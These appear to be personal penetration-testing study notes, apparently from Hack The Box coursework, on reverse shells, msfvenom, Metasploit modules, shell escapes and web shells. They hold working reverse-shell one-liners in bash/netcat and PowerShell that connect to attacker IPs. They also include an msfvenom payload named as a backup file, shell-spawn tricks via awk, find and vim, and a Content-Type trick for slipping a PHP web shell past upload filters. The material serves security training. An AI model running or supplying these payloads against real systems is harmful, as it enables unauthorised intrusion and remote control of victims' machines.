
## One-Liners payload

Netcat/Bash Reverse Shell One-liner

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```


Powershell One-liner

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.233',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

You can view much more in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Msfvenom

Msfvenom is used to craft payalod, encrypt and encode payload ecc...
To list all available payloads:

List Payloads

```shell-session
Poiint@htb[/htb]$ msfvenom -l payloads
```

When we craft/use a payload, we must keep in mind if we have to use a stageless or a stage payload. Staged payload are more louder since there's more network traffic. So it's better to use stageless payloads. Staged payload have this syntax:
`linux/x86/shell/reverse_tcp`
Where we can see that "shell" is the stage.
A stageless payload look like this:
`windows/meterpreter_reverse_tcp`
if it was "meterpreter/reverse_tcp" then it would be staged.

To craft a payload with msfvenom, we can use this command:
```shell-session
Poiint@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
Where:
+ "-p": Specifies the payload (you can list with the command above).
+ "LHOST": Specifies the local host. If we are using a reverse shell (recommended) this will be our local machine. 
+ "LPORT": Specifies the local port. Be careful to use a free one.
+ "-f": Specifies the file extension. We specify ".elf" for linux OS, ".exe" for windows.
+ "-o or >" Specifies the output file.
Remember to start a nc listener in our machine before triggering the payload.





## Add metasploit exploit
We can add a metasploit module from Rapid7 website or from searchsploit.
To do so, we first need to locate where the exploits are
Locate

```shell-session
Poiint@htb[/htb]$ locate exploits
```

They usually will be in:
`/usr/share/metasploit-framework/modules/exploits`

We copy our .rb file into that folder, update the msf database with:
`apt update; apt install metasploit-framework`
And restart msfconsole. Then we should able to use it.
## Interactive shells
### Bash

Interactive

```shell-session
/bin/sh -i
```

### Perl
Perl To Shell

```shell-session
perl â€”e 'exec "/bin/sh";'
```

Perl To Shell

```shell-session
perl: exec "/bin/sh";
```

The command directly above should be run from a script.

### Ruby
Ruby To Shell

```shell-session
ruby: exec "/bin/sh"
```


### Lua  
Lua To Shell

```shell-session
lua: os.execute('/bin/sh')
```


### AWK

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:

#### AWK To Shell

AWK To Shell

```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

### Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.

#### Using Find For A Shell

Using Find For A Shell

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

Using Find For A Shell

```shell-session
find . -exec /bin/sh \; -quit
```

### VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

#### Vim To Shell

Vim To Shell

```shell-session
vim -c ':!/bin/sh'
```

#### Vim Escape

Vim Escape

```shell-session
vim
:set shell=/bin/sh
:shell
```


## WebShells

### Laudanum
Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). Let's examine Laudanum and see how it works. The Laudanum files can be found in the `/usr/share/webshells/laudanum` directory.

### Antak
Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on `Antak`. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak. The Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.
When you upload and trigger the payload, it will be asked to prompt some credentials. The credentials are inside the payload script so before uploading it, it's recommended to change these and save them for afterwards.

### PHP
We will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a `.php` file. Keep in mind that the file type is significant, as we will soon witness.

We can bypass upload filters by using Burp-Suite and changing the Content-Type parameter: 
We will change Content-type from `application/x-php` to `image/gif`.